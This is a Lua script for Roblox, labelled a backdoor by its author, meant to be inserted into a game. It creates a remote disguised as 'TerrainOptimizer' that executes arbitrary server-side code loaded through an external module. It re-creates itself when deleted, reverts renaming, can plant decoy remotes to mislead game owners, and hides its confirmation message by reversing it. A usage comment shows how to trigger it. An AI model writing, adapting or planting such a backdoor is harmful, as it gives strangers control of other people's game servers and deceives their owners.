--[[ 
backdoor by batussz
What ts backdoor got???:
1. Universal / Key Mode
== If you want to add backdoor to your game, you can change the universal setting on settings table to true.
== Or if you want to secure your backdoor from backdoor finders, you can use the key mode. Which is will generate a new global variable with 7 numbers.
== If they guessed the key wrong they will get kicked. Else its gonna execute the code.
2. Anti Delete
== If the remote gets deleted, it will be added back INSTANTLY.
3. Anti Name Tamper
== If the remote name gets changed, it will be back to TerrainOptimizer
4. Name Whitelist
== You dont want strangers to use your backdoor remote? Well you can name whitelist! If they are not the same name as your name they will get kicked.
5. Fake Backdoor Remotes
== You can calm down the owner if they found those fake remotes. But thats not gonna do anything!
]]


local exec = function(inp) 
  local module = require(14132891321) 
  module:SpawnS(inp,workspace) 
end

local Settings = {
  FakeRemoteSettings = {
  FakeRemoteNames = {"backdoored", "infect", "listen", "infected", "command", "admin"},
  Service = game.ReplicatedStorage,
    Count = 1
  },
  
  FakeRemotes = false,
  Universal = true,
  NameWhitelist = false,
  Names = {}
}

if Settings.Universal == false then
  local lclKey = "batussz"..math.random(1000000, 9999999)
  _G._= lclKey
  print(_G._, lclKey)
  _G["rc"] = function() return _G._ end
  print("Your code: >> "..lclKey.." <<\n[Use this code to execute script on Server-Side.]")
  --print(_G["rc"]()) -- prints out the code
end

if Settings.FakeRemotes == true then
  for i=1, Settings.FakeRemoteSettings.Count do
    local rand = math.random(1, #Settings.FakeRemoteSettings.FakeRemoteNames)
    local FakeEvent = Instance.new("RemoteEvent", Settings.FakeRemoteSettings.Service)
    FakeEvent.Name = Settings.FakeRemoteSettings.FakeRemoteNames[rand]
  end
end

function Create()
    local re = Instance.new("RemoteEvent", workspace.Terrain)
    re.Name = "TerrainOptimizer"

    re.OnServerEvent:Connect(function(plr, k, code)
      ------------
      if Settings.NameWhitelist == true then
        if table.find(Settings.Names, plr.Name) then
          exec(code)
        else
          plr:Kick("not authorized name.")
        end
        return
      end
      
      if Settings.Universal == true then
        exec(code)
      elseif Settings.Universal == false then
        if k == lclKey or k == _G._ then
          exec(code)
          return
        else
          plr:Kick("wrong pass on universal.")
          return
      end
      end
    end)
      
      -- Anti Name Tamper
re:GetPropertyChangedSignal("Name"):Connect(function()
  if (re.Name ~= "TerrainOptimizer") then
    re.Name = "TerrainOptimizer"
  end
end)
    end

function DetectChange()
    workspace.Terrain.DescendantRemoving:Connect(function(c)
        if c.Name == "TerrainOptimizer" then
            Create()
        end
    end)
end
  --[[
  Usage:
  Universal:
  workspace.Terrain.TerrainOptimizer:FireServer("SomethingKey", "print('hi')")
  Key:
  workspace.Terrain.TerrainOptimizer:FireServer("batussz4731663", "print('hi')")
  ]]

-- Creating The Backdoor
Create()
DetectChange()
print(string.reverse(".detresni yllufsseccus si roodkcaB | zssutaB yB roodkcaB"))
